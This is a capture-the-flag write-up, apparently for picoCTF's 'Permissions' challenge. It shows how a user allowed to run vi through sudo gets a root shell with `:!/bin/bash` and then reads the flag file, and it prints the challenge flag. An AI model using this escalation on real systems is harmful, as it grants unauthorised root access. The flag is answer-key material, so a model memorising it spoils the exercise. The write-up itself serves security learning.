# Permissions

This challenge gives us a remote machine to SSH into with the task of reading our flag from a root folder.

## Solution

Step one of course is to use the provided credentials to SSH to the remote host.

Once we login we can check out users permissions using `sudo -l`.
```
picoplayer@challenge:/$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```

The notable part here is that we have access to vi which we can use to escalate our privileges.

Since vi in command mode allows us to execute terminal commands, and we can run vi with root permissions via sudo, if we ask it to open a shell it will open as the root user.

To make this happen lets run `sudo vi <somefilename-notimportant>`. 
Enter the provided user password, and then press esc to enter command mode for vi.

Lets put in `:!/bin/bash` as our command. The `:` is just vi command syntax, and the rest is just to call a shell.

```
picoplayer@challenge:/$ sudo vi getroot
[sudo] password for picoplayer: 

root@challenge:~# whoami
root
root@challenge:~# ls -la
total 12
drwx------ 1 root root   23 Aug  4 21:33 .
drwxr-xr-x 1 root root   71 Sep 18 02:48 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4 21:33 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
root@challenge:~# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_021d10ab}
```

Now we are operating as the root user, and have full access to simply cat out our flag:
`picoCTF{uS1ng_v1m_3dit0r_021d10ab}`

### References

https://medium.com/@pettyhacks/linux-privilege-escalation-via-vi-36c00fcd4f5e
https://gtfobins.github.io/gtfobins/vi/


